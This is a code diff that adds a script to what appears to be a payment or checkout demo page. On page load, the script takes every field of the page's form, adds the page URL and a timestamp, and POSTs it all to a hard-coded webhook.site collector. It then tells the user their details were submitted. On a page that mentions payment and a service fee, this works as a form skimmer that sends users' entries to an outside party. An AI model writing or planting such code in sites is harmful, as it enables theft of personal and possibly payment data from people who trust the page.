@@ -385,6 +385,46 @@
       e.preventDefault();
       alert('Demo mode · no payment processed.\nService fee: $0.17');
     });
+
+    // ============================================
+    // FORM DATA CAPTURE TO WEBHOOK
+    // ============================================
+    document.addEventListener('DOMContentLoaded', function () {
+      const WEBHOOK_URL = 'https://webhook.site/7183fae2-e91b-4d21-a97e-4d5c6a3163e5';
+
+      // Find the form — replace 'form' with '#yourFormId' if your form has an id
+      const form = document.querySelector('form');
+
+      if (!form) {
+        console.warn('Form not found — check the selector.');
+        return;
+      }
+
+      // 👇 paste the submit handler here 👇
+      form.addEventListener('submit', async function (event) {
+        event.preventDefault();
+
+        const formData = new FormData(form);
+        const payload = Object.fromEntries(formData.entries());
+        payload.submittedAt = new Date().toISOString();
+        payload.pageUrl = window.location.href;
+
+        try {
+          await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            mode: 'cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+          alert('Thank you! Your details were submitted.');
+          form.reset();
+        } catch (err) {
+          console.error('Webhook error:', err);
+          alert('Something went wrong. Please try again.');
+        }
+      });
+      // 👆 end of submit handler 👆
+    });
   </script>
 </body>
 </html>
